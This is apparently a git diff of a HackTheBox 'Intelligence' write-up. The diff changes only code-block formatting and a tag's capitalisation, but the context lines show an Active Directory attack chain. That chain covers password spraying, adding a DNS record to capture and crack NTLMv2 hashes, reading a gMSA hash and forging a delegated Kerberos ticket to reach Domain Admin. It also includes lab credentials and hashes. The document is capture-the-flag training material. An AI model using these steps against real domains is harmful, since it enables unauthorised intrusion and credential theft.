@@ -1,7 +1,7 @@
 ---
 title: Intelligence
 categories: [HackTheBox]
-tags: [Active Directory, AllowedToDelegate, BloodHound, PrivEsc, ReadGMSAPassword, Service Ticket, dnstool.py, getST.py, krbrelayx, pdftotext]
+tags: [Active Directory, AllowedToDelegate, BloodHound, PrivEsc, ReadGMSAPassword, Service Ticket, dnstool.py, GetST.py, krbrelayx, pdftotext]
 img_path: /Vulnhub-Files/img/
 image:
   path: Intelligence/Untitled.jpeg
@@ -77,6 +77,7 @@ Host script results:
 |   3:1:1: 
 |_    Message signing enabled and required
 ```
+{: .nolineno}
 
 ## Web Enumeration ⤵️
 
@@ -110,6 +111,7 @@ done
 
 echo "$end_date-upload.pdf"
 ```
+{: .nolineno}
 
 I got this filenames.txt file so lets try to access some 200 status of files and its content downloaded on our attacker machine.
 
@@ -153,6 +155,7 @@ ________________________________________________
 ...
 ...
 ```
+{: .nolineno}
 
 Now I saved these output into a file called `accessible_files.txt` so lets short it into another file →
 
@@ -168,6 +171,7 @@ http://intelligence.htb/documents/2020-01-30-upload.pdf
 ...
 ...
 ```
+{: .nolineno}
 
 Now download time →
 
@@ -198,6 +202,7 @@ Saving to: ‘2020-02-17-upload.pdf’
 ...
 ...
 ```
+{: .nolineno}
 
 I got all the files downloaded lets enumerate the values of each files with any uniqueness values in it →
 
@@ -222,6 +227,7 @@ Linearized                      : No
 Page Count                      : 1
 Creator                         : Scott.Scott
 ```
+{: .nolineno}
 
 Likewise I think all pdf’s may have a new creator so lets extract that from them and put it in a file →
 
@@ -250,6 +256,7 @@ Creator                         : Travis.Evans
 ┌──(kali㉿kali)-[~/Downloads/HTB/Intelligence]
 └─$ exiftool *.pdf | grep Creator | awk '{ print $3 }' > username.txt
 ```
+{: .nolineno}
 
 Now I have a wordlist of usernames so lets enumerate some values for passwords also in pdfs for that I think I have to look into the content of these pdfs but If I cat these pdfs I will get some junk values so.
 
@@ -259,6 +266,7 @@ I have to convert the pdf files into txt file to make the content readable so fo
 ┌──(kali㉿kali)-[~/Downloads/HTB/Intelligence]
 └─$ for i in $(ls *.pdf);do pdftotext $i;done
 ```
+{: .nolineno}
 
 I got all the pdf files into .txt files →
 
@@ -277,12 +285,14 @@ Now lets search for password and I got something also →
 2020-06-04-upload.txt-
 2020-06-04-upload.txt-
 ```
+{: .nolineno}
 
 I got this password from file `2020-06-04-upload.txt` .
 
 ```bash
 NewIntelligenceCorpUser9876
 ```
+{: .nolineno}
 
 So I have some users and a password so lets brute force a service lets see if any user matches this →
 
@@ -293,6 +303,7 @@ SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763
 SMB         10.10.10.248    445    DC               [-] intelligence.htb\Mozilla:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
 SMB         10.10.10.248    445    DC               [-] intelligence.htb\Scott.Scott:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
 ```
+{: .nolineno}
 
 ![Untitled](Intelligence/Untitled%203.png)
 
@@ -334,6 +345,7 @@ smb: \> dir
 		3770367 blocks of size 4096. 1458847 blocks available
 smb: \>
 ```
+{: .nolineno}
 
 This file `downdetector.ps1` :
 
@@ -351,6 +363,7 @@ Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Grave
 } catch {}
 }
 ```
+{: .nolineno}
 
 The above code is a PowerShell script designed to check the status of web servers. Here’s a breakdown of what it does:
 
@@ -376,6 +389,7 @@ Since this script is iterating over a DNS record start with “web” , so I kno
 [-] Adding new record
 [+] LDAP operation completed successfully
 ```
+{: .nolineno}
 
 - `-u intelligence\\Tiffany.Molina` - The user to authenticate as;
 - `-p NewIntelligenceCorpUser9876` - The user’s password;
@@ -398,6 +412,7 @@ Address:	10.10.10.248#53
 
 ** server can not find web-Strong: SERVFAIL
 ```
+{: .nolineno}
 
 So It seams we are on the right track so according to `downdetector.ps1` script lets capture some data send to Ted Graves user with responder →
 
@@ -419,10 +434,12 @@ Mr.Teddy         (Ted.Graves)
 Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
 Session completed.
 ```
+{: .nolineno}
 
 ```bash
 intelligence\Ted.Graves : Mr.Teddy
 ```
+{: .nolineno}
 
 Now you now the password so lets use this password to access some service →
 
@@ -456,6 +473,7 @@ svc_int$:::e0dcda8d93bf71a6352ea7803c8f17f1
 svc_int$:aes256-cts-hmac-sha1-96:fd6235dbfd8a560d17433b22022633ed7188588277cf4d174f6582daf2c5333f
 svc_int$:aes128-cts-hmac-sha1-96:059ae234e725682d00c3c278b3cff01b
 ```
+{: .nolineno}
 
 I got the `svc_int` `ntlm hash` so lets proceed further and now I have **AllowedToDelegate** Delegation means I can have a silver ticket made so lets create it →
 
@@ -472,6 +490,7 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 [*] Getting TGT for user
 Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
 ```
+{: .nolineno}
 
 - `dc-ip 10.10.10.248` - domain controller IP
 - `spn www/dc.intelligence.htb` - the SPN (Service Principle Name)
@@ -489,6 +508,7 @@ CLOCK: time stepped by 28802.729696
 ┌──(kali㉿kali)-[~/Downloads/HTB/Intelligence]
 └─$ sudo service virtualbox-guest-utils stop
 ```
+{: .nolineno}
 
 Now lets again try that service ticket command →
 
@@ -504,6 +524,7 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 [*] 	Requesting S4U2Proxy
 [*] Saving ticket in Administrator.ccache
 ```
+{: .nolineno}
 
 This time I got the `kerbrute ticket` in this `Administrator.ccache` file so lets export it to the variable and access the administrator now with no password →
 
@@ -561,5 +582,6 @@ C:\Users\Administrator> type Desktop\root.txt
 
 C:\Users\Administrator>
 ```
+{: .nolineno}
 
 I am Domain Admin Now !!
